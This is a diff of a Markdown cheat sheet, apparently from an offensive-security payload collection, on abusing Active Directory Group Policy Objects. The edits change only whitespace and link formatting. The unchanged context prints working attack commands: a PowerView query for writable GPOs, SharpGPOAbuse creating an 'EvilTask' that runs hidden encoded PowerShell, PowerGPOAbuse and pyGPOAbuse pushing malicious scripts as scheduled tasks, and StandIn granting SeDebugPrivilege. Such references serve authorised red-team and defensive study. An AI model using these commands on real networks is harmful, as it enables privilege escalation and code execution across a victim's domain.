@@ -7,8 +7,7 @@
 GPO are stored in the DC in `\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\`, inside two folders **User** and **Machine**.
 If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at `Machine\Preferences\ScheduledTasks`.
 
-:warning: Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: `gpupdate /force`. 
-
+:warning: Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: `gpupdate /force`.
 
 ## Find vulnerable GPO
 
@@ -17,7 +16,6 @@ Look a GPLink where you have the **Write** right.
 ```powershell
 Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
 ```
-
 
 ## Abuse GPO with SharpGPOAbuse
 
@@ -42,10 +40,9 @@ $ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\
 .\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
 ```
 
-
 ## Abuse GPO with PowerGPOAbuse
 
-* https://github.com/rootSySdk/PowerGPOAbuse
+* <https://github.com/rootSySdk/PowerGPOAbuse>
 
 ```ps1
 PS> . .\PowerGPOAbuse.ps1
@@ -63,7 +60,6 @@ PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(
 PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
 ```
 
-
 ## Abuse GPO with pyGPOAbuse
 
 ```powershell
@@ -80,7 +76,6 @@ $ git clone https://github.com/Hackndo/pyGPOAbuse
     -description "Dis is legit, pliz no delete" \ 
     -user
 ```
-
 
 ## Abuse GPO with PowerView
 
@@ -104,7 +99,6 @@ StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivil
 # Execute a custom command
 StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
 ```
-
 
 ## References
 
